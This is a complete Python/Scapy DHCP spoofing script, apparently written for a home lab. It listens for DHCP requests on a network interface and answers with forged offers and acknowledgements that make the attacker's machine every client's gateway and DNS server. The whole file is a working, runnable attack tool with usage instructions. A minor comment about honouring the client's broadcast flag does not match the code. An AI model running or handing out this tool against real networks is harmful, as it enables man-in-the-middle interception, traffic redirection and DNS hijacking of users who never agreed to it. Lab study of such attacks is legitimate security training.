#!/usr/bin/env python3
"""
DHCP Spoofing Attack
Autor  : Edgardy Olivero 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 dhcp_spoof.py
"""

from scapy.all import *
import sys, os, signal

IFACE = "eth0.10"
FAKE_GW = "192.168.10.2"
FAKE_DNS = "192.168.10.2"
SUBNET = "255.255.255.0"
POOL = [f"192.168.10.{i}" for i in range(100, 150)]
asignado = {}


def get_opt(pkt, name):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and len(opt) >= 2 and opt[0] == name:
            return opt[1]
    return None


def make_reply(pkt, msg_type, ip):
    # Verificar el flag broadcast del cliente
    flags = pkt[BOOTP].flags
    # Si el cliente pide broadcast (flags=0x8000) o es VPC → usar broadcast
    dst_mac = "ff:ff:ff:ff:ff:ff"
    dst_ip = "255.255.255.255"

    return (
        Ether(dst=dst_mac, src=get_if_hwaddr(IFACE))
        / IP(src=FAKE_GW, dst=dst_ip)
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            yiaddr=ip,
            siaddr=FAKE_GW,
            giaddr="0.0.0.0",
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid,
            flags=flags,  # ← respetar flag del cliente
        )
        / DHCP(
            options=[
                ("message-type", msg_type),
                ("server_id", FAKE_GW),
                ("lease_time", 3600),
                ("subnet_mask", SUBNET),
                ("router", FAKE_GW),
                ("name_server", FAKE_DNS),
                "end",
            ]
        )
    )


def dhcp_handler(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    tipo = get_opt(pkt, "message-type")
    mac = pkt[Ether].src

    if tipo == 1:  # Discover → Offer
        ip = asignado.setdefault(mac, POOL.pop(0) if POOL else None)
        if not ip:
            print("[-] Pool agotado.")
            return
        print(f"[DISCOVER] {mac} → Ofreciendo {ip}  GW={FAKE_GW}")
        sendp(make_reply(pkt, "offer", ip), iface=IFACE, verbose=False)

    elif tipo == 3:  # Request → ACK
        ip = asignado.get(mac)
        if not ip:
            return
        print(f"[REQUEST]  {mac} → Confirmando {ip}  GW={FAKE_GW} ✔")
        sendp(make_reply(pkt, "ack", ip), iface=IFACE, verbose=False)


def cleanup(sig=None, frame=None):
    print(f"\n[+] Detenido. IPs asignadas: {len(asignado)}")
    sys.exit(0)


if os.geteuid() != 0:
    sys.exit("Ejecutar como root.")

signal.signal(signal.SIGINT, cleanup)

print("=" * 45)
print("  DHCP Spoofing - Lab EGALDITO_LAB")
print(f"  Gateway falso : {FAKE_GW}")
print(f"  DNS falso     : {FAKE_DNS}")
print(f"  Pool          : {POOL[0]} - {POOL[-1]}")
print("  Ctrl+C para detener")
print("=" * 45 + "\n")

sniff(iface=IFACE, filter="udp port 67", prn=dhcp_handler, store=False)
